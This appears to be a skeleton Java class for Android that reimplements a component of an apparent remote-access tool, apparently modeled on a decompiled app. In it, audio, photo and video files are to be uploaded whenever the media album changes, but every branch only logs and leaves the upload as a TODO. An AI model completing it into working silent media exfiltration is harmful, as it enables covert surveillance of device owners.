package com.vendor.rat.keepalive.thread;

import android.net.Uri;
import android.util.Log;

import java.util.concurrent.Callable;

/**
 * Vendor: com.guard.wallet.thread.a
 * Media album change observer callable.
 */
public final class MediaChangeThread implements Callable<Boolean> {

    private static final String TAG = "MediaChangeThread";
    private final int mode;
    private final Uri uri;

    public MediaChangeThread(Uri uri, int mode) {
        this.mode = mode;
        this.uri = uri;
    }

    /**
     * Vendor: a.a() - queries media files and uploads
     * mode 0 = audio, mode 1 = photo, default = video
     */
    private Boolean doUpload() {
        // ADAPT: vendor queries ContentResolver with uri, collects files, uploads
        switch (mode) {
            case 0:
                Log.d(TAG, "AudioAlbumChangeThread: uploading audio files");
                // TODO: VENDOR_VERIFY - vendor queries audio, uploads via http.l.A()
                break;
            case 1:
                Log.d(TAG, "PhotoAlbumChangeThread: uploading photo files");
                // TODO: VENDOR_VERIFY - vendor queries photos, uploads via http.l.D()
                break;
            default:
                Log.d(TAG, "VideoAlbumChangeThread: uploading video files");
                // TODO: VENDOR_VERIFY - vendor queries videos, uploads via http.l.E()
                break;
        }
        return Boolean.TRUE;
    }

    @Override
    public Boolean call() {
        return doUpload();
    }
}
